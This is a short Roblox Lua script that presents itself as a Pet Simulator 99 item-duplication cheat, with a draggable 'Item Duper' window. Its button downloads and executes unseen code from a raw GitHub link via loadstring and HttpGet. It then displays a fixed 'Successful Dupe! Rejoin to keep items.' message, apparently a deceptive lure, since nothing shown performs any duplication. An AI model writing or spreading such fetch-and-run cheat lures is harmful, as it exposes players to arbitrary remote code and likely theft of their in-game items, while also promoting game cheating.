-- PS99 item duper rollback method

local plr = game.Players.LocalPlayer
local gui = Instance.new("ScreenGui", plr.PlayerGui)

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 220, 0, 110)
frame.Position = UDim2.new(0.5, -110, 0.5, -55)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BorderSizePixel = 2
frame.BorderColor3 = Color3.fromRGB(0, 0, 0)

local corner = Instance.new("UICorner", frame)
corner.CornerRadius = UDim.new(0, 8)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 30)
title.Text = "Item Duper"
title.BackgroundTransparency = 1
title.TextColor3 = Color3.new(0, 0, 0)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 22

local button = Instance.new("TextButton", frame)
button.Size = UDim2.new(0.8, 0, 0, 40)
button.Position = UDim2.new(0.1, 0, 0.4, 0)
button.Text = "Dupe Items"
button.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
button.TextColor3 = Color3.new(1, 1, 1)
button.Font = Enum.Font.SourceSansBold
button.TextSize = 20

local btncorner = Instance.new("UICorner", button)
btncorner.CornerRadius = UDim.new(0, 6)

-- Draggable
local dragging = false
local dragInput, dragStart, startPos

frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)

frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
    if dragging and input == dragInput then
        local delta = input.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)

frame.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Dupe Items button executes your full script from GitHub
button.MouseButton1Click:Connect(function()
    button.Text = "Duping..."
    
    -- Execute the full script from the raw GitHub link (no .lua extension)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/z6mmy/roblox-script/main/ps99duper"))()
    
    task.wait(3)
    button.Text = "Dupe Items"
    require(game.ReplicatedStorage.Library.Client.Message).Error("Successful Dupe! Rejoin to keep items.")
end)
